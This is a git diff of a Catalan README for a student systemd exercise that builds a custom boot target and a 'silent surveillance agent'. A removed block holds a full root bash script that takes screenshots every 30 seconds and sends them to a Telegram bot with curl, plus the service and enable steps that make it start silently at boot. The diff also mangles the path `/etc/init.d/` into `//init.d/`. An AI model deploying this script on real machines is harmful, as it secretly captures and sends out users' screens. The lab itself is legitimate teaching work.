@@ -76,7 +76,7 @@ readlink -v /sbin/init
 
 * 2.1- Directoris
 
-El directori `/etc/init.d/`
+El directori `//init.d/`
 Aquí hi trobem tots els scripts d'engegada del sistema (els dimonis), com ara `cron`.
 Tot el que està gestionat mitjançant l'estàndard SystemV s'allotja a `init.d`. 
 
@@ -86,6 +86,8 @@ Tot el que està gestionat mitjançant l'estàndard SystemV s'allotja a `init.d`
 
 
 Dintre de `/etc/` també hi trobem les carpetes de `rcX.d` (runlevels):
+
+---
 <img width="413" height="291" alt="image" src="https://github.com/user-attachments/assets/9485aa78-e523-4106-b38a-acbf6f8ab45f" />
 
 <img width="825" height="127" alt="image" src="https://github.com/user-attachments/assets/4514cd8c-89c7-4a11-9958-03116e35c6f7" />
@@ -202,7 +204,7 @@ A simple vista com podem detectar-ho de base? Si fem un _reboot_, l'acció en l'
 
 ---
 
-**PAS 0: Preparar l'entorn **
+**PAS 0: Preparar l'entorn (Instal·lar XFCE per a suport X11)**
 
 L'eina `scrot` necessita funcionar sota un entorn X11 i no és compatible amb Wayland. A més, per disseny, el sistema de seguretat de Wayland bloqueja de forma estricta qualsevol intent silenciós de captura de pantalla des de processos en segon pla justament per prevenir "spyware" com el nostre. 
 
@@ -221,7 +223,7 @@ Per verificar que efectivament hem iniciat sessió sota un entorn X11, obrirem u
 echo $XDG_SESSION_TYPE
 ```
 
-<img width="461" height="44" alt="2026-09-28_19-51" src="https://github.com/user-attachments/assets/5a2b4b18-b0cb-4dbf-a00e-ca7c563731fc" />
+> **(📸 Captura: El terminal mostrant `x11` com a resultat de la variable d'entorn.)**
 
 
 
@@ -463,18 +465,19 @@ curl http://localhost:5000/api/stats
 
 Finalment, obre el navegador a `http://<IP-VM>:5000` i comprova la interfície web.
 
+Exemple 1: Encara no hi ha captures
+<img width="936" height="679" alt="2026-09-28_20-23" src="https://github.com/user-attachments/assets/7402f01e-50f3-4235-8957-29e18a60b643" />
 
-<img width="437" height="47" alt="2026-09-28_20-22" src="https://github.com/user-attachments/assets/d96e05fa-6950-4eb4-a373-4c229191305d" />
+Exemple 2: Es mostren totes les captures
+<img width="960" height="639" alt="2026-09-28_20-27" src="https://github.com/user-attachments/assets/fd0ea2f6-d87d-4c00-974c-f6905ea60671" />
 
-> **(📸 Captura 4: El navegador obert a `http://<IP-VM>:5000` mostrant la interfície web glassmorphism amb les captures a la galeria.)**
-Captura 1: Sense captures
-Captura 2: 3 captures
-Captura 3: 2 captures despres de aplicar filtre
+Cas 3: Es mostren nomes 2 captures despres d'aplicar filtre de temps
+<img width="946" height="699" alt="2026-09-28_20-28" src="https://github.com/user-attachments/assets/786fd563-5683-41cc-ae3c-a4de1fb849e8" />
+
 ---
 
-## Resum de compliment de l'enunciat
-
-| Requisit de la professora | Com es compleix en aquesta activitat |
+## Objectius Completats
+| Requisit | Com es compleix en aquesta activitat |
 |---|---|
 | 1. Crear target propi, fer-lo default i comprovar accés | `pauserra.target` creat al PAS 5, `set-default` al PAS 8, verificat amb `get-default` + `systemctl status` al PAS 9 |
 | 2. Crear servei dintre del target i comprovar que s'inicia al reiniciar | `pauserra-spy.service` i `pauserra-web.service` amb `WantedBy=pauserra.target` als PASSOS 6-7, verificats amb `systemctl status active (running)` al PAS 9 |
@@ -483,211 +486,3 @@ Captura 3: 2 captures despres de aplicar filtre
 
 
 ---
-
-**PAS 1: Instal·lar les dependències necessàries**
-
-Necessitem `scrot` (per fer captures de pantalla) i `curl` (per enviar les imatges a Telegram). En un entorn gràfic, `scrot` necessita accés al display X11.
-
-```bash
-apt update
-apt install -y scrot curl
-```
-
-> **(📸 Captura: Resultat de l'`apt install` mostrant que `scrot` i `curl` han estat instal·lats correctament o ja estan presents.)**
-
----
-
-**PAS 2: Configurar el Bot de Telegram**
-
-Abans de crear l'script, necessitem el `TOKEN` del nostre bot i el `CHAT_ID` del destinatari:
-
-1. Crea un bot nou parlant amb `@BotFather` a Telegram i guarda el **token** (`123456:ABC-DEF...`).
-2. Envia un missatge al bot, després obre al navegador: `https://api.telegram.org/bot<TOKEN>/getUpdates` i copia el `chat.id`.
-
-Apunta els dos valors, els necesssitarem al pas 3.
-
-> **(📸 Captura: Navegador mostrant el JSON de `getUpdates` amb el `chat_id` visible, o el missatge de `@BotFather` amb el token del bot.)**
-
----
-
-**PAS 3: Crear l'script espies `pauserra_spy.sh`**
-
-Creem l'script que farà les captures i les enviarà a Telegram. **Substitueix `TON_TOKEN` i `TON_CHAT_ID` pels valors del pas anterior.**
-
-```bash
-nano /usr/local/bin/pauserra_spy.sh
-```
-
-Contigut de l'script:
-```bash
-#!/bin/bash
-# pauserra_spy.sh — Agent de vigilància silenciós
-# Executa captures de pantalla cada 30s i les envia per Telegram
-
-TOKEN="TON_TOKEN_AQUI"
-CHAT_ID="TON_CHAT_ID_AQUI"
-SCREENSHOT_DIR="/var/log/pauserra_spy"
-DISPLAY_ENV=":0"
-
-mkdir -p "$SCREENSHOT_DIR"
-
-while true; do
-    TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
-    SCREENSHOT="$SCREENSHOT_DIR/screen_$TIMESTAMP.png"
-
-    # Capturem la pantalla de l'usuari gràfic (display :0)
-    DISPLAY=$DISPLAY_ENV scrot "$SCREENSHOT" 2>/dev/null
-
-    if [ -f "$SCREENSHOT" ]; then
-        # Enviem la captura al bot de Telegram
-        curl -s -X POST "https://api.telegram.org/bot${TOKEN}/sendPhoto" \
-            -F chat_id="$CHAT_ID" \
-            -F photo=@"$SCREENSHOT" \
-            -F caption="🕵️ Captura: $TIMESTAMP" \
-            > /dev/null 2>&1
-
-        # Esborrem la captura local per estalviar espai (opcional)
-        rm -f "$SCREENSHOT"
-    fi
-
-    sleep 30
-done
-```
-
-Donem permisos d'execució:
-```bash
-chmod +x /usr/local/bin/pauserra_spy.sh
-```
-
-> **(📸 Captura: Resultat de `ls -la /usr/local/bin/pauserra_spy.sh` mostrant els permisos `rwxr-xr-x` i que el propietari és `root`.)**
-
----
-
-**PAS 4: Executar l'script manualment per verificar que funciona**
-
-Abans de delegar l'execució al sistema, comprovem que l'script funciona correctament executant-lo nosaltres mateixos des del terminal. Aquesta prova manual ens garanteix que la lògica és correcta i que el bot de Telegram respon.
-
-Obre un terminal com a `root` i executa l'script directament:
-```bash
-/usr/local/bin/pauserra_spy.sh &
-```
-
-Espera uns 10-15 segons (el temps que tarda `scrot` a capturar i `curl` a enviar) i comprova el Telegram: hauries de rebre una captura de pantalla amb el caption `🕵️ Captura: YYYYMMDD_HHMMSS`.
-
-Per aturar el procés de prova un cop verificat:
-```bash
-kill %1
-```
-
-Alternativament, si vols veure el que fa en temps real (sense enviar a Telegram), pots fer una captura puntual manualment:
-```bash
-DISPLAY=:0 scrot /tmp/prova_manual.png && ls -lh /tmp/prova_manual.png
-```
-
-> **(📸 Captura 1: El terminal mostrant el procés corrent en segon pla (`[1] PID`) just després d'executar l'script amb `&`.)**
-
-> **(📸 Captura 2: El mòbil o client de Telegram rebent la captura de pantalla en temps real, confirmant que l'script funciona correctament de forma manual.)**
-
----
-
-**PAS 5: Crear el target `pauserra.target`**
-
-Creem el nostre target personalitzat que dependrà de `graphical.target` (s'iniciarà quan l'escriptori estigui llest). El nomenclaturem amb el nostre nom per identificar-lo clarament:
-
-```bash
-nano /etc/systemd/system/pauserra.target
-```
-
-Contingut:
-```ini
-[Unit]
-Description=Target personalitzat Pau Serra — Agent de vigilància
-Requires=graphical.target
-After=graphical.target
-AllowIsolate=yes
-```
-
-> **(📸 Captura: El fitxer `pauserra.target` obert amb `nano` mostrant el contingut sencer, especialment la línia `Requires=graphical.target`.)**
-
----
-
-**PAS 6: Crear el servei `pauserra-spy.service`**
-
-Creem el `.service` que executarà l'script com a `root` i el vincularà al nostre target:
-
-```bash
-nano /etc/systemd/system/pauserra-spy.service
-```
-
-Contingut:
-```ini
-[Unit]
-Description=Agent de vigilància silenciós — Pau Serra
-After=graphical.target
-
-[Service]
-Type=simple
-User=root
-Environment=DISPLAY=:0
-ExecStart=/usr/local/bin/pauserra_spy.sh
-Restart=on-failure
-RestartSec=10
-
-[Install]
-WantedBy=pauserra.target
-```
-
-> **(📸 Captura: El fitxer `pauserra-spy.service` obert amb `nano` mostrant el contingut complet, especialment les línies `User=root` i `WantedBy=pauserra.target`.)**
-
----
-
-**PAS 7: Activar i configurar com a target per defecte**
-
-Executem les comandes en ordre per registrar els nous fitxers, habilitar el servei i fer que el nostre target sigui el que carregui per defecte:
-
-```bash
-systemctl daemon-reload
-systemctl enable pauserra-spy.service
-systemctl set-default pauserra.target
-```
-
-> **(📸 Captura: El terminal mostrant en seqüència els outputs de les tres comandes, especialment la creació del symlink confirmat per `set-default`.)**
-
----
-
-**PAS 8: Reinici i verificació final**
-
-Reinicia la màquina virtual:
-```bash
-reboot
-```
-
-Un cop el sistema hagi arrencat, obre un terminal i comprova que el servei est en execució:
-```bash
-systemctl status pauserra-spy.service
-```
-
-Hauries de veure `active (running)`. A més, al teu Telegram hauries d'aparèixer en breu (en un màxim de 30 segons) la primera captura de pantalla del sistema.
-
-Verifica també quin target és ara el per defecte:
-```bash
-systemctl get-default
-```
-Ha de mostrar `pauserra.target`.
-
-> **(📸 Captura 1: `systemctl status pauserra-spy.service` mostrant `active (running)` i el PID del procés.)**
-
-> **(📸 Captura 2: `systemctl get-default` mostrant `pauserra.target` com a target actiu per defecte.)**
-
-> **(📸 Captura 3: El telèfon o client de Telegram rebent les captures de pantalla del sistema de forma automàtica (sense intervenció manual), amb el caption i la marca de temps visible.)**
-
----
-
-## Resum de compliment de l'enunciat
-
-| Requisit de la professora | Com es compleix en aquesta activitat |
-|---|---|
-| 1. Crear target propi, fer-lo default i comprovar accés | `pauserra.target` creat al PAS 5, `set-default` al PAS 7, verificat amb `get-default` + `systemctl status` al PAS 8 |
-| 2. Crear servei dintre del target i comprovar que s'inicia al reiniciar | `pauserra-spy.service` amb `WantedBy=pauserra.target` al PAS 6, verificat amb `systemctl status active (running)` al PAS 8 |
-| 3. Modificar el servei per executar script amb permisos root | `User=root` al `.service` (PAS 6) + `chmod +x` a l'script (PAS 3) |
-| 4. Programar script i executar-lo manualment per veure si funciona | Script `pauserra_spy.sh` creat al PAS 3, executat manualment i verificat al **PAS 4** |
